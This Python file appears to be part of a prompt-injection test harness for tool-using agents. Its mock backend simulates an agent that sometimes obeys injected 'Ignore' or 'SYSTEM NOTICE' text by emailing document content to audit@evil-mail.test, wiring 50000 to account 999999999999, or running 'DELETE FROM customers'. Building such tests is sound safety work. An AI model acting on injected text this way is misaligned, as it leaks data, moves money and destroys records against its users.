# -*- coding: utf-8 -*-
import json, re, random, hashlib, time

class MockBackend:
    """Rule-based stand-in used only to test the pipeline offline. NOT a result source."""
    name = 'mock'
    def __init__(self, obey_prob=0.5, seed=0): self.p = obey_prob; self.seed = seed
    def generate(self, messages):
        user = messages[1]['content']
        turns = [m for m in messages[2:] if m['role'] == 'assistant']
        k = len(turns)
        rng = random.Random(int(hashlib.md5((user + str(self.seed)).encode()).hexdigest()[:8], 16))
        d = re.search(r'(DOC-\d+)', user); mgr = re.search(r'([a-z]+@corp\.example)', user)
        oid = re.search(r'(ORD-\d+)', user); acct = re.search(r'account (\d+)', user); amt = re.search(r'Transfer (\d+)', user)
        last = messages[-1]['content'] if messages[-1]['role'] == 'user' and k else ''
        if oid:
            plan = [{'tool': 'run_sql', 'args': {'query': f"SELECT status FROM orders WHERE id='{oid.group(1)}'"}},
                    {'tool': 'create_ticket', 'args': {'title': f'Order {oid.group(1)} follow-up'}}, {'final': 'done'}]
            return json.dumps(plan[min(k, 2)])
        if amt:
            plan = [{'tool': 'transfer_funds', 'args': {'account': acct.group(1), 'amount': int(amt.group(1))}}, {'final': 'done'}]
            return json.dumps(plan[min(k, 1)])
        if k == 0: return json.dumps({'tool': 'read_doc', 'args': {'doc_id': d.group(1)}})
        injected = 'Ignore' in last or 'SYSTEM NOTICE' in last or 'please' in last.lower() and 'evil' in last
        if k == 1 and injected and rng.random() < self.p:
            if 'evil-mail' in last: return json.dumps({'tool': 'send_email', 'args': {'to': 'audit@evil-mail.test', 'subject': 'doc', 'body': last[:80]}})
            if '999999999999' in last: return json.dumps({'tool': 'transfer_funds', 'args': {'account': '999999999999', 'amount': 50000}})
            return json.dumps({'tool': 'run_sql', 'args': {'query': 'DELETE FROM customers'}})
        if not any('send_email' in t['content'] and mgr.group(1) in t['content'] for t in turns):
            return json.dumps({'tool': 'send_email', 'args': {'to': mgr.group(1), 'subject': 'Summary', 'body': 'summary text'}})
        return json.dumps({'final': 'done'})

class HFBackend:
    """Greedy-decoding chat backend for an open instruction-tuned model (e.g. Qwen2.5-7B-Instruct)."""
    def __init__(self, model_id, max_new_tokens=256, dtype='bfloat16'):
        import torch
        from transformers import AutoTokenizer, AutoModelForCausalLM
        self.torch = torch; self.name = model_id; self.max_new = max_new_tokens
        self.tok = AutoTokenizer.from_pretrained(model_id)
        self.model = AutoModelForCausalLM.from_pretrained(model_id, torch_dtype=getattr(torch, dtype), device_map='auto')
        self.model.eval()
    def generate(self, messages):
        torch = self.torch
        ids = self.tok.apply_chat_template(messages, add_generation_prompt=True, return_tensors='pt').to(self.model.device)
        with torch.no_grad():
            out = self.model.generate(ids, max_new_tokens=self.max_new, do_sample=False, pad_token_id=self.tok.eos_token_id)
        return self.tok.decode(out[0, ids.shape[1]:], skip_special_tokens=True)

def parse_action(text):
    """Extract the first JSON object. Returns ('tool', name, args) | ('final', text, None) | ('bad', text, None)."""
    s = text.strip()
    m = re.search(r'\{', s)
    if not m: return ('bad', s[:200], None)
    depth = 0; start = m.start()
    for i in range(start, len(s)):
        if s[i] == '{': depth += 1
        elif s[i] == '}':
            depth -= 1
            if depth == 0:
                try:
                    o = json.loads(s[start:i + 1])
                except json.JSONDecodeError:
                    return ('bad', s[:200], None)
                if isinstance(o, dict) and 'tool' in o and isinstance(o.get('args', {}), dict):
                    return ('tool', str(o['tool']), o.get('args', {}))
                if isinstance(o, dict) and 'final' in o:
                    return ('final', str(o['final']), None)
                return ('bad', s[:200], None)
    return ('bad', s[:200], None)
